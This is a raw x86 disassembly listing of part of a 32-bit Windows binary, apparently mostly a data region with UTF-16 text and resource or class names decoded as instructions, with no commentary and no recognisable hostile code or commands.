  4224f8:	add    BYTE PTR gs:[esi+0x0],ch
  4224fc:	push   0x61006500
  422501:	add    BYTE PTR [esi+0x0],dh
  422504:	add    BYTE PTR gs:[esi+0x0],ch
  422508:	push   0x61006500
  42250d:	add    BYTE PTR [esi+0x0],dh
  422510:	add    BYTE PTR gs:[esi+0x0],ch
  422514:	push   0x61006500
  422519:	add    BYTE PTR [esi+0x0],dh
  42251c:	add    BYTE PTR gs:[esi+0x0],ch
  422520:	push   0x61006500
  422525:	add    BYTE PTR [esi+0x0],dh
  422528:	add    BYTE PTR gs:[esi+0x0],ch
  42252c:	push   0x61006500
  422531:	add    BYTE PTR [esi+0x0],dh
  422534:	add    BYTE PTR gs:[esi+0x0],ch
  422538:	push   0x61006500
  42253d:	add    BYTE PTR [esi+0x0],dh
  422540:	add    BYTE PTR gs:[esi+0x0],ch
  422544:	push   0x61006500
  422549:	add    BYTE PTR [esi+0x0],dh
  42254c:	add    BYTE PTR gs:[esi+0x0],ch
  422550:	push   0x61006500
  422555:	add    BYTE PTR [esi+0x0],dh
  422558:	add    BYTE PTR gs:[esi+0x0],ch
  42255c:	add    BYTE PTR [eax],al
  42255e:	add    BYTE PTR [eax],al
  422560:	fsub   QWORD PTR [edx+eax*2]
  422563:	add    BYTE PTR [edi+0x6c],cl
  422566:	gs dec ecx
  422568:	arpl   WORD PTR [edi+0x6e],bp
  42256b:	push   esp
  42256c:	outs   dx,DWORD PTR ds:[esi]
  42256d:	inc    ebx
  42256e:	jne    0x4225e2
  422570:	jae    0x4225e1
  422572:	jb     0x422574
  422574:	fs and eax,0x42
  42257a:	add    BYTE PTR [eax],al
  42257c:	add    BYTE PTR [eax],al
  42257e:	add    BYTE PTR [eax],al
  422580:	and    BYTE PTR [ecx],ch
  422582:	inc    edx
  422583:	add    BYTE PTR [eax],ch
  422585:	sub    DWORD PTR [edx+0x0],eax
  422588:	loopne 0x4225b1
  42258a:	inc    edx
  42258b:	add    dl,dh
  42258d:	inc    edx
  42258e:	push   ebx
  42258f:	lea    edx,ds:0x1a59ba5
  422595:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422596:	popf   
  422597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422598:	jno    0x42253f
  42259a:	xchg   edi,eax
  42259b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42259c:	or     esp,DWORD PTR [ebp-0x5aac5a77]
  4225a2:	and    DWORD PTR [ebp-0x5a7a5ae7],0xffffff9b
  4225a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225aa:	mov    ebx,0xd183d3a5
  4225af:	lea    edx,[ebp-0x645aea5b]
  4225b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225b6:	add    DWORD PTR [ebp-0x5a8e5a63],esp
  4225bc:	xchg   edi,eax
  4225bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225be:	or     esp,DWORD PTR [ebp-0x5aac5a77]
  4225c4:	and    DWORD PTR [ebp-0x5a7a5acb],0xffffff9b
  4225cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225cc:	mov    ebx,0xd1e3d3a5
  4225d1:	in     eax,dx
  4225d2:	xchg   ebp,eax
  4225d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225d4:	adc    eax,0x3ba59ba5
  4225d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225da:	popf   
  4225db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225dc:	sbb    DWORD PTR [ebp-0x5a805a6b],esp
  4225e2:	(bad)  
  4225e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225e4:	fwait
  4225e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225e6:	xchg   DWORD PTR [ebp-0x322e3c2d],esp
  4225ec:	icebp  
  4225ed:	sub    eax,0xf172ff7
  4225f2:	adc    eax,0x3a59109
  4225f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225f8:	fwait
  4225f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225fa:	add    esp,DWORD PTR [ebp-0x5a805a6d]
  422600:	xchg   ebp,eax
  422601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422602:	sbb    DWORD PTR [ebp-0x5a645a73],esp
  422608:	and    DWORD PTR [ebp+0x2dd123d3],0xfffffff1
  42260f:	or     eax,0x6f170ff7
  422614:	adc    eax,0x3a59169
  422619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42261a:	fwait
  42261b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42261c:	add    esp,DWORD PTR [ebp-0x5a805a6d]
  422622:	xchg   ebp,eax
  422623:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422624:	xor    eax,0x9ba58da5
  422629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42262a:	and    DWORD PTR [ebp+0xdd103d3],0xfffffff1
  422631:	ins    DWORD PTR es:[edi],dx
  422632:	imul   DWORD PTR [edi+0x17]
  422635:	dec    edi
  422636:	adc    eax,0x37a59149
  42263b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42263c:	fwait
  42263d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42263e:	jae    0x4225e5
  422640:	popf   
  422641:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422642:	sbb    DWORD PTR [ebp-0x5aba5a6b],esp
  422648:	(bad)  
  422649:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42264a:	fwait
  42264b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42264c:	and    DWORD PTR [ebp+0x6dd163d3],0xfffffff1
  422653:	dec    ebp
  422654:	test   DWORD PTR [edi+0x16],0x91a914af
  42265b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42265c:	aaa    
  42265d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42265e:	fwait
  42265f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422660:	jae    0x422607
  422662:	popf   
  422663:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422664:	pop    ss
  422665:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422666:	xchg   ebp,eax
  422667:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422668:	push   ecx
  422669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42266a:	mov    DWORD PTR [ebp-0x5a725a65],esp
  422670:	rol    DWORD PTR [ebx-0x2f],cl
  422673:	dec    ebp
  422674:	lock lods eax,DWORD PTR ds:[esi]
  422676:	imul   BYTE PTR [edi-0x76eb70ea]
  42267c:	xchg   ecx,eax
  42267d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42267e:	aaa    
  42267f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422680:	fwait
  422681:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422682:	jae    0x422629
  422684:	popf   
  422685:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422686:	cmp    esp,DWORD PTR [ebp-0x5a8c5a6b]
  42268c:	(bad)  
  42268d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42268e:	fwait
  42268f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422690:	xchg   DWORD PTR [ebp-0x522f5c2e],esp
  422696:	lock (bad) 
  422698:	test   BYTE PTR [edi-0x16eb10ea],0x91
  42269f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a0:	aaa    
  4226a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a2:	fwait
  4226a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a4:	jae    0x42264b
  4226a6:	popf   
  4226a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226a8:	cmp    DWORD PTR [ebp-0x5a805a6b],esp
  4226ae:	(bad)  
  4226af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226b0:	fwait
  4226b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226b2:	and    DWORD PTR [ebp-0x722f7c2e],0xfffffff0
  4226b9:	in     eax,dx
  4226ba:	imul   bh
  4226bc:	push   ss
  4226bd:	iret   
  4226be:	adc    al,0xc9
  4226c0:	xchg   ecx,eax
  4226c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226c2:	cmp    eax,0x51a59ba5
  4226c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226c8:	popf   
  4226c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ca:	jnp    0x422671
  4226cc:	xchg   ebx,eax
  4226cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ce:	fwait
  4226cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226d0:	xchg   ecx,eax
  4226d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226d2:	shl    bl,cl
  4226d4:	shr    ch,1
  4226d6:	lock int 0xf6
  4226d9:	iret   
  4226da:	push   ss
  4226db:	das    
  4226dc:	adc    al,0x29
  4226de:	push   ss
  4226df:	unpcklps xmm1,XMMWORD PTR [ecx]
  4226e2:	xchg   ebx,eax
  4226e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226e4:	adc    DWORD PTR [ebp-0x5ab65a65],esp
  4226ea:	lahf   
  4226eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ec:	cmp    esp,DWORD PTR [ebp-0x5a825a6d]
  4226f2:	mov    DWORD PTR [ebp-0x5a725a65],esp
  4226f8:	shl    BYTE PTR [ebx],cl
  4226fa:	shr    BYTE PTR ds:0xff60df0,1
  422700:	push   ss
  422701:	outs   dx,DWORD PTR ds:[esi]
  422702:	adc    al,0x69
  422704:	xchg   ecx,eax
  422705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422706:	add    BYTE PTR [eax],al
  422708:	nop
  422709:	and    eax,0x279c0042
  42270e:	inc    edx
  42270f:	add    BYTE PTR [edi+eiz*1+0x292c0042],ah
  422716:	inc    edx
  422717:	add    BYTE PTR [eax-0x57ffbddb],cl
  42271d:	daa    
  42271e:	inc    edx
  42271f:	add    dh,cl
  422721:	jle    0x422765
  422723:	add    BYTE PTR [esi-0x7f],al
  422726:	inc    edx
  422727:	add    BYTE PTR [eax+0x1c004228],bl
  42272d:	sub    DWORD PTR [edx+0x0],eax
  422730:	test   BYTE PTR [edi],ah
  422732:	inc    edx
  422733:	add    BYTE PTR [eax+0x18004227],cl
  422739:	sub    DWORD PTR [edx+0x0],eax
  42273c:	in     al,dx
  42273d:	daa    
  42273e:	inc    edx
  42273f:	add    BYTE PTR [edx-0x36],cl
  422742:	push   es
  422743:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422744:	scas   al,BYTE PTR es:[edi]
  422745:	or     eax,0x27a0a506
  42274a:	inc    edx
  42274b:	add    BYTE PTR [eax+0x28],dl
  42274e:	inc    edx
  42274f:	add    BYTE PTR [eax+ebp*1+0x42],ah
  422753:	add    BYTE PTR [eax+0x28],dh
  422756:	inc    edx
  422757:	add    BYTE PTR [eax-0x27ffbdd8],al
  42275d:	daa    
  42275e:	inc    edx
  42275f:	add    BYTE PTR [ebp+eiz*1+0x27f80042],cl
  422766:	inc    edx
  422767:	add    al,ch
  422769:	daa    
  42276a:	inc    edx
  42276b:	add    BYTE PTR [eax],dh
  42276d:	sub    DWORD PTR [edx+0x0],eax
  422770:	scas   al,BYTE PTR es:[edi]
  422771:	fwait
  422772:	push   es
  422773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422774:	cmp    BYTE PTR [edx-0x19],al
  422777:	mov    esp,0x422808
  42277c:	adc    BYTE PTR [eax],ch
  42277e:	inc    edx
  42277f:	add    BYTE PTR [edi+eiz*1-0x79dbffbe],ch
  422786:	loopne 0x422744
  422788:	jbe    0x422804
  42278a:	pop    ds
  42278b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42278c:	add    BYTE PTR [eax],al
  42278e:	inc    eax
  42278f:	add    cl,dh
  422791:	retf   
  422792:	arpl   WORD PTR [eax+0x43],bx
  422795:	add    DWORD PTR [edx+0x0],0x6ae878a8
  42279c:	ja     0x4227ac
  42279e:	pop    ebx
  42279f:	xor    BYTE PTR [esi-0x6],dh
  4227a2:	(bad)  
  4227a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227a4:	mov    dl,0xd
  4227a6:	xchg   ebx,eax
  4227a7:	test   eax,0x422794
  4227ac:	stos   BYTE PTR es:[edi],al
  4227ad:	fild   DWORD PTR [esi]
  4227af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b0:	stos   BYTE PTR es:[edi],al
  4227b1:	fild   WORD PTR [esi]
  4227b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227b5:	fild   DWORD PTR [esi]
  4227b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227b8:	mov    ds:0xbea506db,al
  4227bd:	fild   DWORD PTR [esi]
  4227bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227c0:	mov    edx,0xb6a506db
  4227c5:	fild   DWORD PTR [esi]
  4227c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227c8:	mov    dl,0xdb
  4227ca:	push   es
  4227cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227cc:	mov    ds,ebx
  4227ce:	push   es
  4227cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d0:	mov    bl,bl
  4227d2:	push   es
  4227d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d4:	out    dx,al
  4227d5:	fild   DWORD PTR [esi]
  4227d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227d8:	dec    DWORD PTR [edx]
  4227da:	adc    edi,DWORD PTR [ebx]
  4227dc:	test   BYTE PTR ds:0x2a750042,ah
  4227e2:	inc    edx
  4227e3:	add    BYTE PTR [ecx+0x73],ah
  4227e6:	push   0x69bae79
  4227eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227ec:	cmp    cl,dl
  4227ee:	xlat   BYTE PTR ds:[ebx]
  4227ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4227f0:	dec    sp
  4227f2:	add    BYTE PTR [eax],al
  4227f4:	and    BYTE PTR ds:0x42220042,0x1b
  4227fb:	add    DWORD PTR [eax],0x0
	...
  422806:	add    BYTE PTR [eax],al
  422808:	hlt    
  422809:	stc    
  42280a:	sar    BYTE PTR [edi+edi*4+0x2b309341],cl
  422811:	inc    esi
  422812:	pop    ds
  422813:	jg     0x422815
	...
  422839:	add    BYTE PTR [eax],al
  42283b:	add    dh,cl
  42283d:	jle    0x422881
	...
  42284b:	add    BYTE PTR [edi-0x4c],al
  42284e:	inc    ecx
  42284f:	add    BYTE PTR [ebp-0x5b],cl
  422852:	push   ecx
  422853:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422854:	jg     0x4227fb
  422856:	inc    edi
  422857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422858:	push   ecx
  422859:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42285a:	inc    ebx
  42285b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42285c:	std    
  42285d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42285e:	jmp    DWORD PTR [ebp+0xa59b]
  422864:	push   ebp
  422865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422866:	push   ebx
  422867:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422868:	dec    ecx
  422869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42286a:	std    
  42286b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42286c:	jmp    DWORD PTR [ebp-0x5a8e5a65]
  422872:	jge    0x422819
  422874:	push   ecx
  422875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422876:	jg     0x42281d
  422878:	std    
  422879:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42287a:	jmp    DWORD PTR [ebp+0xa59b]
  422880:	jge    0x422827
  422882:	dec    ebx
  422883:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422884:	inc    ebx
  422885:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422886:	jne    0x42282d
  422888:	pop    ecx
  422889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42288a:	jnp    0x422831
  42288c:	dec    ecx
  42288d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42288e:	fwait
  42288f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  422898:	xor    eax,ecx
  42289a:	xor    esp,DWORD PTR [ecx]
  42289c:	xor    eax,DWORD PTR [ecx]
  42289e:	xor    esp,DWORD PTR [ecx+0x33]
  4228a1:	inc    ecx
  4228a2:	xor    ah,BYTE PTR [ecx-0x1ecd7ece]
  4228a8:	xor    al,cl
  4228aa:	xor    ah,BYTE PTR [ecx]
  4228ac:	xor    al,BYTE PTR [ecx]
  4228ae:	xor    ah,BYTE PTR [ecx+0x32]
  4228b1:	inc    ecx
  4228b2:	xor    eax,DWORD PTR [ecx-0x3ccc1ecd]
  4228b8:	xor    ecx,ebp
  4228ba:	xor    ecx,edi
  4228bc:	xor    ecx,ecx
  4228be:	xor    ecx,ebx
  4228c0:	xor    edx,ebp
  4228c2:	xor    edx,edi
  4228c4:	xor    edx,ecx
  4228c6:	xor    edx,ebx
  4228c8:	xor    ebx,ebp
  4228ca:	xor    ebx,edi
  4228cc:	xor    ebx,ecx
  4228ce:	xor    ebx,ebx
  4228d0:	xor    eax,edi
  4228d2:	push   ebx
  4228d3:	shl    DWORD PTR [ebx-0x3f],0x93
  4228d7:	rcl    BYTE PTR [esi-0x55],0x15
  4228db:	iret   
  4228dc:	xchg   ebp,eax
  4228dd:	dec    eax
  4228de:	xor    ecx,ebp
  4228e0:	sbb    eax,0x50aaaae3
  4228e5:	imul   ebx,DWORD PTR [esi],0x2f
  4228e8:	je     0x4228ff
  4228ea:	mov    DWORD PTR [edx+0x556ad694],ecx
  4228f0:	imul   edi,ebx,0xffffffd5
  4228f3:	enter  0x4927,0xef
  4228f7:	popf   
  4228f8:	mov    dh,0xde
  4228fa:	dec    esi
  4228fb:	xchg   esp,eax
  4228fc:	lock xor BYTE PTR [esi-0x6b],ch
  422900:	inc    ebp
  422901:	or     al,0x76
  422903:	or     DWORD PTR [edi-0x40],eax
  422906:	js     0x4228c2
  422908:	popa   
  422909:	pop    eax
  42290a:	jecxz  0x422976
  42290c:	mov    BYTE PTR [ebx-0x56],0x4
  422910:	cs leave 
  422912:	inc    esi
  422913:	stos   DWORD PTR es:[edi],eax
  422914:	inc    esp
  422915:	ds inc ebp
  422917:	enter  0x82f6,0x93
  42291b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42291c:	sbb    DWORD PTR [eax],ecx
  42291e:	fdivr  DWORD PTR [esp+ebp*1-0x1e]
  422922:	inc    edx
  422923:	add    cl,dl
  422925:	ja     0x422996
  422927:	mov    WORD PTR gs:[edi],fs
  42292a:	inc    edx
  42292b:	add    al,dh
  42292d:	daa    
  42292e:	inc    edx
  42292f:	add    BYTE PTR [esi-0x6],dh
  422932:	fbld   TBYTE PTR [eax+eax*1+0x0]
  422939:	add    BYTE PTR [eax],al
  42293b:	add    BYTE PTR [eax],al
  42293d:	add    BYTE PTR [eax],al
  42293f:	add    BYTE PTR [eax-0x15],bl
  422942:	push   ss
  422943:	cmp    eax,0x65646543
  422948:	push   esi
  422949:	imul   ebp,DWORD PTR gs:[esi+0x6f],0x616f7377
  422951:	jb     0x4229c7
  422953:	gs bound esp,QWORD PTR gs:[ecx+0x6c]
  422958:	jecxz  0x422921
  42295a:	shr    DWORD PTR [ebx+edx*8-0x3f],0xa3
  42295f:	cmp    al,BYTE PTR [esi-0x2d]
  422962:	jno    0x4229de
  422964:	outs   dx,DWORD PTR ds:[esi]
  422965:	jae    0x4229d7
  422967:	popa   
  422968:	je     0x4229d2
  42296a:	bound  esp,QWORD PTR [ecx+0x73]
  42296d:	je     0x4229de
  42296f:	outs   dx,DWORD PTR ds:[esi]
  422970:	test   eax,0xde3655f5
  422975:	in     al,0x6c
  422977:	jne    0x4229e1
  422979:	bound  esp,QWORD PTR [ebp+0x4b]
  42297c:	popa   
  42297d:	jbe    0x4229e0
  42297f:	outs   dx,WORD PTR ds:[esi]
  422981:	jns    0x4229f2
  422983:	imul   edi,DWORD PTR [eax],0x2c054cf4
  422989:	pusha  
  42298a:	and    BYTE PTR [edi+0x79],dh
  42298d:	gs jo  0x4229ff
  422990:	ins    DWORD PTR es:[edi],dx
  422991:	ja     0x422a0c
  422993:	gs inc ebp
  422995:	jns    0x4229fc
  422997:	jb     0x422999
	...
  4229a9:	add    BYTE PTR [eax],al
  4229ab:	add    BYTE PTR [esi-0x4e],dl
  4229ae:	and    dl,BYTE PTR [ecx]
  4229b0:	imul   esp,DWORD PTR [ebx+0x75],0x74
  4229b4:	imul   ebp,DWORD PTR [di+0x70],0xd71e3755
  4229bc:	fldcw  WORD PTR [eax+edx*2]
  4229bf:	fimul  WORD PTR [ebx]
  4229c1:	cmp    esi,DWORD PTR [esp+eax*4-0x66]
  4229c5:	fldcw  WORD PTR [eax+0x69]
  4229c8:	lods   al,BYTE PTR ds:[esi]
  4229c9:	repnz retf 0xe41c
  4229cd:	inc    ebx
  4229ce:	outs   dx,DWORD PTR ds:[esi]
  4229cf:	je     0x422a44
  4229d1:	dec    esp
  4229d2:	popa   
  4229d3:	jp     0x422a4e
  4229d5:	push   ebx
  4229d6:	imul   esp,DWORD PTR [ecx+0x73],0x73
  4229da:	push   0xc3066a00
  4229df:	lds    eax,FWORD PTR [eax+0x6569646f]
  4229e5:	add    al,bl
  4229e7:	mov    ebp,0x2ee9d1e4
  4229ec:	jle    0x4229a0
  4229ee:	data16 gs ja 0x422a65
  4229f2:	jne    0x422a56
  4229f4:	add    BYTE PTR [eax],al
  4229f6:	add    DWORD PTR [edx+0x51cf72f8],edi
  4229fc:	fstp   DWORD PTR [eax+0x74]
  4229ff:	popa   
  422a00:	jae    0x422a74
  422a02:	popa   
  422a03:	js     0x422a6d
  422a05:	outs   dx,DWORD PTR ds:[esi]
  422a06:	add    BYTE PTR [eax],al
  422a08:	mov    esi,0x4d270df8
  422a0d:	popa   
  422a0e:	ins    BYTE PTR es:[edi],dx
  422a0f:	je     0x422a5d
  422a11:	jne    0x422a85
  422a13:	imul   eax,DWORD PTR [eax],0x0
  422a16:	dec    edx
  422a17:	loope  0x422a27
  422a19:	out    0xd3,al
  422a1b:	test   al,0x57
  422a1d:	popa   
  422a1e:	jb     0x422a8b
  422a20:	jne    0x422a96
  422a22:	outs   dx,DWORD PTR fs:[esi]
  422a24:	bound  ebp,QWORD PTR [edi+0x0]
  422a27:	add    BYTE PTR [ebp+eax*1+0x62cfc27],dl
  422a2e:	jne    0x422a9d
  422a30:	outs   dx,DWORD PTR ds:[esi]
  422a31:	js     0x422a33
  422a33:	add    BYTE PTR [ecx+edx*8+0x58],ch
  422a37:	or     bh,BYTE PTR [ecx+ebx*2]
  422a3a:	add    al,0xd6
  422a3c:	gs ins DWORD PTR es:[edi],dx
  422a3e:	jns    0x422aaf
  422a40:	jo     0x422ab7
  422a42:	je     0x422a97
  422a44:	push   0x6170676f
  422a49:	jns    0x422ab5
  422a4b:	outs   dx,DWORD PTR ds:[esi]
  422a4c:	popa   
  422a4d:	jns    0x422a09
  422a4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a50:	scas   al,BYTE PTR es:[edi]
  422a51:	or     al,0xaf
  422a53:	adc    al,0x63
  422a55:	popa   
  422a56:	jns    0x422a9f
  422a58:	jne    0x422ad0
  422a5a:	jae    0x422ad0
  422a5c:	imul   esp,DWORD PTR [ebx+0x73],0x61636f6e
  422a63:	jb     0x422aca
  422a65:	imul   ebp,DWORD PTR [ecx+0x25],0xffffffda
  422a69:	(bad)  
  422a6a:	out    dx,al
  422a6b:	push   ebx
  422a6c:	popa   
  422a6d:	arpl   WORD PTR [ebx+0x66],si
  422a70:	imul   esp,DWORD PTR [edx+0x64],0x9780006f
  422a77:	xchg   DWORD PTR [esi-0x7488fe6a],edx
  422a7d:	push   eax
  422a7e:	ja     0x422a0a
  422a80:	cdq    
  422a81:	adc    bh,0x8a
  422a84:	pop    esi
  422a85:	fldenv [ecx+0x6f5038a6]
  422a8b:	adc    bh,0x8b
  422a8e:	arpl   WORD PTR [edx],si
  422a90:	test   eax,0x92fcefd7
  422a95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a96:	xchg   ah,bh
  422a98:	fsubr  st,st(7)
  422a9a:	arpl   sp,di
  422a9c:	fsub   DWORD PTR [esi+0xc92fc86]
  422aa2:	cdq    
  422aa3:	jo     0x422b19
  422aa5:	xchg   edi,eax
  422aa6:	add    BYTE PTR [edi+0x77019696],0x8b
  422aad:	push   eax
  422aae:	ja     0x422a3a
  422ab0:	adc    BYTE PTR [edi-0x2703a176],0x5b
  422ab7:	cmp    BYTE PTR [eax+0xc],dl
  422aba:	adc    BYTE PTR [edi-0x28089c75],0x9
  422ac1:	xor    BYTE PTR [edi-0x11],0xfc
  422ac5:	xchg   edx,eax
  422ac6:	xor    BYTE PTR [ebp+0x138c6dfc],ah
  422acc:	cld    
  422acd:	xchg   edx,eax
  422ace:	outs   dx,DWORD PTR ds:[esi]
  422acf:	mov    ds:0x31ec92fc,eax
  422ad4:	jo     0x422ad1
  422ad6:	out    dx,al
  422ad7:	lea    edx,[edi-0x69697880]
  422add:	add    DWORD PTR [edi-0x75],esi
  422ae0:	push   eax
  422ae1:	ja     0x422a6d
  422ae3:	adc    BYTE PTR [edi-0x2326a176],0x1c
  422aea:	hlt    
  422aeb:	push   eax
  422aec:	or     al,0x80
  422aee:	xchg   edi,eax
  422aef:	mov    esp,DWORD PTR [ebx-0x9]
  422af2:	xlat   BYTE PTR ds:[ebx]
  422af3:	out    dx,al
  422af4:	cld    
  422af5:	xchg   edx,eax
  422af6:	mov    WORD PTR [ebx],ss
  422af8:	xor    BYTE PTR [edi-0x11],0xfc
  422afc:	xchg   edx,eax
  422afd:	cmp    dl,BYTE PTR [esi+0x65306dfc]
  422b03:	jo     0x422b00
  422b05:	out    dx,al
  422b06:	lea    edx,[edi-0x69697880]
  422b0c:	add    DWORD PTR [edi-0x75],esi
  422b0f:	push   eax
  422b10:	ja     0x422a9c
  422b12:	cdq    
  422b13:	adc    bh,0x8a
  422b16:	pop    esi
  422b17:	fsubrp st(7),st
  422b19:	xor    edi,DWORD PTR [eax+edx*2]
  422b1c:	outs   dx,DWORD PTR ds:[esi]
  422b1d:	adc    bh,0x8b
  422b20:	arpl   WORD PTR [edx],si
  422b22:	test   eax,0xd8fca6d7
  422b27:	out    dx,al
  422b28:	fwait
  422b29:	mov    ecx,0x31ec927c
  422b2e:	fwait
  422b2f:	cld    
  422b30:	or     al,0x43
  422b32:	jo     0x422ba8
  422b34:	xchg   edi,eax
  422b35:	add    BYTE PTR [edi+0x77019696],0x8b
  422b3c:	push   eax
  422b3d:	ja     0x422ac9
  422b3f:	adc    BYTE PTR [edi-0x6d1fa176],0x3b
  422b46:	cmp    BYTE PTR [eax+0xc],dl
  422b49:	adc    BYTE PTR [edi-0x28089c75],0xff
  422b50:	xor    BYTE PTR [edi-0x11],0xfc
  422b54:	xchg   edx,eax
  422b55:	out    dx,eax
  422b56:	mov    ds:0x963a6dfc,eax
  422b5b:	cld    
  422b5c:	xchg   edx,eax
  422b5d:	das    
  422b5e:	stos   DWORD PTR es:[edi],eax
  422b5f:	jo     0x422b5c
  422b61:	out    dx,al
  422b62:	lea    ebx,[ebx-0x7f686c67]
  422b68:	xchg   DWORD PTR [eax+0x773a3577],eax
  422b6e:	cmp    eax,0xd7808a0a
  422b73:	sbb    eax,0x9925d73a
  422b78:	adc    bh,0x15
  422b7b:	dec    eax
  422b7c:	shr    DWORD PTR [edx-0x12f24e71],1
  422b82:	std    
  422b83:	dec    ebp
  422b84:	xchg   esp,eax
  422b85:	test   BYTE PTR [ebx-0x9],cl
  422b88:	or     cl,BYTE PTR [edi+0x4dfded51]
  422b8e:	xchg   esp,eax
  422b8f:	test   BYTE PTR [ebx-0x9],cl
  422b92:	or     cl,BYTE PTR [esi+edi*8]
  422b95:	or     BYTE PTR ds:0x432187ed,0x6a
  422b9c:	ins    DWORD PTR es:[edi],dx
  422b9d:	or     cl,BYTE PTR [edx]
  422b9f:	or     cl,BYTE PTR [edx]
  422ba1:	or     bl,BYTE PTR [ebx-0x1266f4bd]
  422ba7:	adc    DWORD PTR [ebp+0x5e],ecx
  422baa:	(bad)  
  422bab:	in     al,dx
  422bac:	lea    ecx,[ebp+0x10018494]
  422bb2:	pop    ecx
  422bb3:	mov    WORD PTR [ebp-0x1172a173],cs
  422bb9:	(bad)  
  422bba:	out    dx,al
  422bbb:	mov    dh,0xbe
  422bbd:	mov    BYTE PTR [edx+eiz*8+0x2f],0x9f
